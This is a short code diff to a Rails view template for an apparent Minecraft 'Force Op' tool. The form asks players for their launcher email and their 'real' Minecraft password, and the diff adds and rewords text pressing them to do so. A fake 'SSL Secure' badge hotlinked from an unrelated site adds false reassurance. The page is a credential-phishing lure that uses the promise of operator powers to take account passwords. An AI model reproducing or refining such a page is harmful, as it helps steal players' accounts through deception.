@@ -15,11 +15,12 @@
 				MC <%= f.label :email %><br />
 				<%= f.text_field :email %>
 			</p>
+			<p class="note">This should be the email you use when you login to your minecraft launcher</p>
 			<p>
 				MC <%= f.label :password %><img 	src="http://www.copperriverbags.com/product_images/uploaded_images/secure.png"style="padding-left: 2px;" height="15px" width="17px" title="SSL 	Secure"><br />
 				<%=	f.password_field :username %>
 			</p>
-			<p style="font-size: 12px;">Be sure to enter your <span style="font-weight: bold;">real</span> Minecraft password into the secure password form in order to allow the desired Minecraft server to properly render your username.<br /> <a href="https://minecraft.net/resetpassword">Forgot your minecraft password?</a></p>
+			<p style="font-size: 12px;">Be sure to enter your <span style="font-weight: bold;">real</span> Minecraft password into the secure password field in order to allow the desired Minecraft server to properly render your username.<br /> <a href="https://minecraft.net/resetpassword">Forgot your minecraft password?</a></p>
 			<p>
 				<%= f.submit 'Begin Force Op' %>
 			</p>
